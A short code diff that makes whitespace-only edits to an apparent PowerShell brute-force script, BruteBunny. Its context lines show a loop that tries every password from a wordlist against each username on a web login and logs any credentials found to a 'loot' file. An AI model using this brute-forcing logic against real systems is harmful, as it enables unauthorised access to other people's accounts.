@@ -20,12 +20,12 @@ $PasswordList = $Bunny+"\BruteBunny\wordlists\passwords.txt"
 $StopOnSuccess = $true
 
 $url = $Protocol + "://" + $Hostname + ":" + $Port + "/"
-  
-  
+
+
 # Read in lists for usernames and passwords
 $Usernames = Get-Content $UsernameList
 $Passwords = Get-Content $PasswordList
-  
+
 # Does a depth first loop over usernames first, trying every password for each username sequentially in the list
 :UNLoop foreach ($Username in $Usernames)
 {
@@ -47,7 +47,7 @@ $Passwords = Get-Content $PasswordList
       $message | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
       $content = $webClient.DownloadString($url) | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
       # Continues on to print succesful credentials
-      $success = $true 
+      $success = $true
       #$success
       if ($success -eq $true)
       {
